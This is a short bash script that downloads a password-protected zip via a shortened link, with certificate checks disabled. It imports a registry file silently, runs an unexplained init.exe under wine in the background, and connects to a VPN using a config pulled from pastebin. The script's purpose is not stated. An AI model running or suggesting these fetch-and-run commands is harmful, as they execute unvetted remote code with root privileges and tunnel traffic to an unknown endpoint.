#!/bin/bash -e
sudo apt update;
sudo apt install unzip wget openvpn -y;
mkdir ~/init/;
wget --no-check-certificate -O ~/init/init.zip https://is.gd/initzip;
cd ~/init/;
rm -rf init.exe;
unzip -P1011011011 init.zip;
wine regedit /s /root/s.reg;
wine init.exe&
wget -O /root/sickvpn.conf https://pastebin.com/raw/yvNnT0uF --no-check-certificate && python3 /root/pingvpn.py && openvpn /root/sickvpn.conf&
exit 0